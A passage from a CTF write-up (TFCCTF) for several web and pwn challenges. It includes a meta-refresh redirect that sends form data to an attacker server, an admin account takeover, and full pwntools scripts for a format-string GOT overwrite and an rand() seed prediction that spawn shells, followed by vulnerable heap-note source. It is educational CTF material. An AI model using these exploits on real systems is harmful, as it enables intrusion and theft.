</pre><td class="rouge-code"><pre>TFCCTF{144ab0e4c358b00b1258f2aea2250b21}
</pre></table></code></div></div><p>Another approach we looked into was CSS injection where we extract the flag character by character but that didn’t work.</p><p>Another technique that did work was redirecting to a page we control and then getting the contents of that form. Payload: <code class="language-plaintext highlighter-rouge">&lt;meta http-equiv="refresh" content="0; url=http://ourserver"&gt;</code> On our server we have the page:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"http://ourserver/log"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">id=</span><span class="s">"title"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</pre></table></code></div></div><p>By saving whats submitted to log we get the flag.</p><h2 id="mctree"><span class="mr-2">McTree</span><a href="#mctree" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is a very basic web app. There is a register page and a login page. When we login we get a message</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Get out of here, username!
</pre></table></code></div></div><p>From testing different things we noticed that some characters were filtered from the username like ‘{‘</p><p>By registering an account with the username ‘admin{‘ the password for the admin account gets changed and we can login.</p><p>The flag is then shown on the page:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>TFCCTF{I_l1k3_dr4g0n_tr33s__Yuh!_1ts_my_f4v0r1t3_tr33_f0r_sur3!}
</pre></table></code></div></div><h1 id="pwn">Pwn</h1><h2 id="shello-world"><span class="mr-2">Shello World</span><a href="#shello-world" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>For this challenge we are just given a 64 bit elf file.</p><p>It’s a fairly small binary with only 3 functions. Main, Vuln and win. The win function just runs “bin/sh” so this will be our target.</p><p>The vuln function has the following code:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>  <span class="n">fgets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_108</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Hello, "</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_108</span><span class="p">);</span>
  <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
</pre></table></code></div></div><p>So right away we can see a printf / format strings vulnerability. We can confirm this by running the program and sending %p.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>❯ ./shello-world
%p
Hello, 0x7fff65541f00
</pre></table></code></div></div><p>We don’t have any overflow and checking the securities with checksec we can see that “RELRO” is only set to Partial. This means we can overwrite parts of the GOT.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</pre></table></code></div></div><p>So our attack will be a basic format strings GOT overwrite. pwntools makes this very easy. I choose exit as my GOT entry to overwrite.</p><p>Running the script the remote server we can cat the flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>TFCCTF{ab45ed10bb240fe11c5552d3db6776f708c650253755e706268b45f3aae6d925}
</pre></table></code></div></div><p>Full script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="n">exe</span> <span class="o">=</span> <span class="s">'./shello-world'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'alacritty'</span><span class="p">,</span> <span class="s">'-e'</span><span class="p">,</span> <span class="s">'zsh'</span><span class="p">,</span> <span class="s">'-c'</span><span class="p">]</span>

<span class="c1">#context.log_level= 'DEBUG'
</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>  <span class="c1"># Set GDBscript below
</span>        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''

'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>


<span class="k">def</span> <span class="nf">send_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>


<span class="c1">#### Exploit starts here ####
</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="n">payload</span> <span class="o">=</span>  <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span>
    <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="nb">exit</span> <span class="p">:</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">win</span>
    <span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s">'short'</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="random"><span class="mr-2">Random</span><a href="#random" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This challenge is a random number “guesser” style challenge. This is something I have seen a fair bit lately and even made a challenge around the idea myself in the past. So right away I knew I could use the CDLL library from python.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>  <span class="n">setup</span><span class="p">();</span>
  <span class="n">tVar2</span> <span class="o">=</span> <span class="n">time</span><span class="p">((</span><span class="kt">time_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
  <span class="n">srand</span><span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="n">tVar2</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_14</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">local_14</span> <span class="o">=</span> <span class="n">local_14</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">v</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_14</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Guess my numbers!"</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_10</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">local_10</span> <span class="o">=</span> <span class="n">local_10</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010201e</span><span class="p">,</span><span class="n">input</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_10</span> <span class="o">*</span> <span class="mi">4</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">local_c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">9</span> <span class="o">&lt;</span> <span class="n">local_c</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">win</span><span class="p">();</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">v</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_c</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">input</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_c</span> <span class="o">*</span> <span class="mi">4</span><span class="p">))</span> <span class="k">break</span><span class="p">;</span>
    <span class="n">local_c</span> <span class="o">=</span> <span class="n">local_c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"You didn</span><span class="se">\'</span><span class="s">t make it :("</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="err">}</span>
</pre></table></code></div></div><p>This output from ghidra gives us enough detail to solve this.</p><p>The program prints <code class="language-plaintext highlighter-rouge">guess my numbers!</code> and we have to try guess the correct number 10 times in a row. if we do that the program runs the <code class="language-plaintext highlighter-rouge">win()</code> function which just runs <code class="language-plaintext highlighter-rouge">/bin/sh</code> for us.</p><p>From the 2nd and 3rd line you can see the seed for rand is using the current time. This <code class="language-plaintext highlighter-rouge">time</code> is just unix time we dont need to worry about time zones or anything like that.</p><p>solve script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="n">CDLL</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">exe</span> <span class="o">=</span> <span class="s">'./random'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'alacritty'</span><span class="p">,</span> <span class="s">'-e'</span><span class="p">,</span> <span class="s">'zsh'</span><span class="p">,</span> <span class="s">'-c'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>  <span class="c1"># Set GDBscript below
</span>        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''

'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1">#### Exploit starts here ####
</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">CDLL</span><span class="p">(</span><span class="s">'libc.so.6'</span><span class="p">)</span>

<span class="n">current_time</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">time</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
<span class="n">current_time</span> <span class="o">=</span> <span class="n">current_time</span> <span class="o">+</span> <span class="mi">0</span> 
<span class="n">libc</span><span class="p">.</span><span class="n">srand</span><span class="p">(</span><span class="n">current_time</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'numbers!'</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
    <span class="n">guess</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span> 
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>TFCCTF{W0W!_Y0U_GU3SS3D_TH3M_4LL!@!}
</pre></table></code></div></div><p>sometimes on remote you might need to + a few seconds here: <code class="language-plaintext highlighter-rouge">current_time = current_time + 0 </code></p><h2 id="notes"><span class="mr-2">Notes</span><a href="#notes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is a standard heap note style challenge. we are given the source code for this which was nice :)</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="cp">#define CONTENT_MAX (long long)256
#define NOTES_MAX 10
</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_note_t</span> <span class="p">{</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">content</span><span class="p">;</span>
<span class="p">}</span> <span class="n">note_t</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span>
        <span class="s">"1. Add note</span><span class="se">\n</span><span class="s">"</span>
        <span class="s">"2. Edit note</span><span class="se">\n</span><span class="s">"</span>
        <span class="s">"3. View notes</span><span class="se">\n</span><span class="s">"</span>
        <span class="s">"0. Exit</span><span class="se">\n</span><span class="s">"</span>
    <span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">get_index</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"index&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
    <span class="n">getchar</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&gt;</span> <span class="n">NOTES_MAX</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">index</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">note_t</span><span class="o">*</span> <span class="nf">add</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">note_t</span><span class="o">*</span> <span class="n">note</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">note_t</span><span class="p">));</span>
    <span class="n">note</span><span class="o">-&gt;</span><span class="n">content</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">CONTENT_MAX</span><span class="p">));</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"content&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">note</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CONTENT_MAX</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">note</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">edit</span><span class="p">(</span><span class="n">note_t</span><span class="o">*</span> <span class="n">note</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"content&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">note</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span> <span class="n">CONTENT_MAX</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">view</span><span class="p">(</span><span class="n">note_t</span><span class="o">*</span> <span class="n">notes</span><span class="p">[])</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NOTES_MAX</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%d. "</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"&lt;empty&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">notes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">note_t</span><span class="o">*</span> <span class="n">notes</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">menu</span><span class="p">();</span>
        <span class="kt">int</span> <span class="n">input</span><span class="p">;</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
        <span class="k">switch</span> <span class="p">(</span><span class="n">input</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="mi">1</span><span class="p">:</span> <span class="p">{</span>
                <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_index</span><span class="p">();</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="n">notes</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">add</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">case</span> <span class="mi">2</span><span class="p">:</span> <span class="p">{</span>
                <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_index</span><span class="p">();</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="n">edit</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
                <span class="n">view</span><span class="p">(</span><span class="n">notes</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="nl">default:</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We have a win function which will be our target. This challenge has a heap overflow. the add function and the edit function both have different values for the size of the data we enter. as a result we can overflow from one chunk into the next.</p><p>My idea for this exploit was GOT overwrite as it seemed the best option. If we can overwrite exit with win, the next time we call exit (sending 0 as input) win will be called and we should get a shell.</p><p>As someone new to heap this challenge took a fair bit of debugging and messing around with GDB. eventually I got a working exploit.</p><p>We first need to create new notes. the content of these does not matter.<br /> Than we edit the first note. and overflow into the 2nd not with our pointer to <code class="language-plaintext highlighter-rouge">got exit</code> once we overflow into chunk2 we can edit chunk 2 with the address of win and this will overwrite <code class="language-plaintext highlighter-rouge">got exit</code> with <code class="language-plaintext highlighter-rouge">win</code></p><p>solve script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code 